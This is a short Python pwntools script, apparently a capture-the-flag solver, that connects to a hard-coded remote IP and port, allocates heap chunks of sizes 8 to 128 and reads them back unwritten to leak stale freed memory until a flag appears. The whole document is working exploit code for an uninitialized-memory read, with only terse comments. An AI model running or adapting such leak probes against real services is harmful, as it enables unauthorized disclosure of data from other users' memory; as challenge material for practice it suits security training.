#!/usr/bin/env python3
from pwn import *

HOST, PORT = "13.206.57.188", 10049

def leak(size):
    io = remote(HOST, PORT)
    io.recvuntil(b"cmd:")
    # allocate index 0, given size
    io.sendline(f"A 0 {size}".encode())
    resp = io.recvuntil(b"cmd:", timeout=2)
    # read index 0 WITHOUT writing -> stale freed data
    io.sendline(b"R 0")
    data = io.recvuntil(b"cmd:", timeout=2)
    io.close()
    return resp + data

for size in range(8, 129, 8):
    out = leak(size)
    if b"flag" in out.lower() or b"{" in out:
        log.success(f"size={size}: {out!r}")
        break
    else:
        log.info(f"size={size}: {out!r}")
